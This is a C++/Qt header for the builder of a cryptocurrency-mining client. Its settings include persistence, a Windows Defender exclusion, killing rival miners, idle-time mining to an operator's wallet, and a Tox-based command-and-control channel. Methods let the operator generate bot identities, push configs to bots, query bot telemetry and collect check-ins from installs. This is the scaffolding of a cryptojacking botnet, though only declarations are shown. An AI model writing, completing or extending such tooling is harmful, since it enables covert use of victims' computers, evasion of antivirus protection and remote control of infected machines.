#pragma once

#include <QObject>
#include <QString>
#include <QStringList>
#include <QDir>
#include <QJsonObject>
#include <QRecursiveMutex>
#include <functional>

class BuildSystem : public QObject
{
    Q_OBJECT

public:
    struct BuildConfig {
        QString panelUrl;
        QString configUrl;
        bool persistence = false;
        bool debugConsole = false;
        bool adminManifest = false;
        bool defenderExclusion = false;
        bool foreignMinerKiller = false;
        bool cpuMiner = true;
        bool gpuMiner = false;
        bool embedConfig = false;
        QString embeddedConfigPath;

        // --- mining settings (serialised into the embedded fallback config) --
        QString minerPool;
        QString minerWallet;
        QString minerPassword;
        bool    useTls = false;
        bool    mineOnIdle = true;
        bool    mineOnActive = false;
        int     idleAfterMin = 5;
        int     idleEffortPct   = 100; // % CPU threads when idle   (1-100)
        int     activeEffortPct = 50;  // % CPU threads when active (1-100)
        // Comma-separated process names the Foreign Miner Killer must never
        // terminate (serialised into the config's watched_processes array).
        QString watchedProcesses;

        // --- Tox C2 ----------------------------------------------------------
        QString idTox;             // manual operator Tox ID (76-hex), fallback
        // Generated operator + bot pair (persisted in AppSettings). When both
        // are set they are embedded into the client as tox_config.json.
        QString toxOperatorId;
        QString toxOperatorSavedata;   // hex
        QString toxBotId;
        QString toxBotSavedata;        // hex
        QString toxBotName;

        // --- config update channel: endpoint | tox | config_link ------------
        // Default matches AppSettings ("tox"); every caller overwrites from
        // settings, but a divergent default here is a trap for direct users.
        QString configUpdateMode = QStringLiteral("tox");
    };

    struct Dependencies {
        bool chocolatey = false;
        bool cmake = false;
        bool mingw = false;
    };

    explicit BuildSystem(QObject *parent = nullptr);
    ~BuildSystem() = default;

    Dependencies checkDependencies() const;
    bool installDependencies(const std::function<void(const QString&)> &output = nullptr);
    bool build(const BuildConfig &config, const std::function<void(const QString&)> &output = nullptr);

    // --- Tox C2 helpers (used by the Control page) --------------------------
    // Cached helper binary path (may not exist yet).
    QString toxCliPath() const;
    // Builds toxcli into a scratch dir and caches the exe, if not already there.
    bool ensureToxCli(const std::function<void(const QString&)> &output = nullptr);
    // Runs toxcli keygen; fills the generated operator + bot identities.
    bool generateToxPair(QString &operatorId, QString &operatorSavedata,
                         QString &botId, QString &botSavedata,
                         const QString &botName,
                         const std::function<void(const QString&)> &output = nullptr);
    // Pushes a JSON config to a bot over Tox (operator savedata = hex).
    // When updatedOperatorSavedata is non-null it receives the operator
    // savedata after the bot was added to the friend list (may be unchanged).
    bool sendToxConfig(const QString &operatorSavedata, const QString &botId,
                       const QString &messageJson,
                       const std::function<void(const QString&)> &output = nullptr,
                       QString *updatedOperatorSavedata = nullptr);
    // Queries a bot's telemetry over Tox ("status" → JSON). Returns true on
    // success and fills replyJson with the bot's reply.
    bool queryToxStatus(const QString &operatorSavedata, const QString &botId,
                        QString &replyJson,
                        const std::function<void(const QString&)> &output = nullptr,
                        QString *updatedOperatorSavedata = nullptr);
    // Listens for hello/status from any bot sharing the operator (unique per-install IDs).
    bool listenForHellos(const QString &operatorSavedata, int seconds, QStringList &hellos,
                         const std::function<void(const QString&)> &output = nullptr,
                         QString *updatedOperatorSavedata = nullptr);

    static QString projectRoot();
    static bool isRunningAsAdmin();

    // Called at app startup to recover from a build that was killed mid-run.
    // If a stale <clientDir>/backup/ dir exists, the previous build was
    // interrupted before its qScopeGuard could restore source files — this
    // finishes the restore so the operator's endpoint URL isn't permanently
    // baked into main.cpp. Returns true if a recovery happened.
    static bool recoverStaleBackup(QString *messageOut = nullptr);

    // The client's config schema (cpu_config / gpu_config / enable flags),
    // built from the mining settings. Used for the embedded fallback and for
    // the Control page's live config push.
    static QJsonObject miningConfigJson(const BuildConfig &config);

signals:
    void outputReceived(const QString &text);
    void buildComplete(bool success);
    void progressUpdated(int percent, const QString &message);

private:
    // Locates the client source dir (the one containing CMakeLists.txt) even
    // when the builder runs from a Qt Creator shadow-build directory.
    static QString resolveClientDir();

    bool runCommand(const QString &program, const QStringList &args,
                    const std::function<void(const QString&)> &output = nullptr,
                    const QString &workingDir = QString());
    bool ensureChocolatey(const std::function<void(const QString&)> &output = nullptr);
    bool ensureCMake(const std::function<void(const QString&)> &output = nullptr);
    bool ensureMinGW(const std::function<void(const QString&)> &output = nullptr);
    bool modifySourceFiles(const BuildConfig &config, const std::function<void(const QString&)> &output = nullptr);
    bool runCMakeBuild(const QString &buildDir, const BuildConfig &config,
                       const std::function<void(const QString&)> &output = nullptr);
    bool writeEmbeddedConfig(const BuildConfig &config);
    bool writeToxConfig(const BuildConfig &config);
    QString makeProgramPath() const;
    QString mingwBinDir() const;
    // Absolute path to a usable cmake.exe: same known-location strategy as
    // makeProgramPath(). Empty when none is found (caller falls back to PATH).
    QString cmakePath() const;
    void backupSourceFiles(const QString &clientDir);
    void restoreSourceFiles(const QString &clientDir);

    QString m_clientDir;
    QString m_buildDir;

    // Serialises the long-running entry points. QRecursiveMutex so nested
    // processEvents() re-entry from runCommand on the UI thread cannot deadlock
    // the non-recursive QMutex (build holds lock for minutes while pumping).
    QRecursiveMutex m_runLock;
};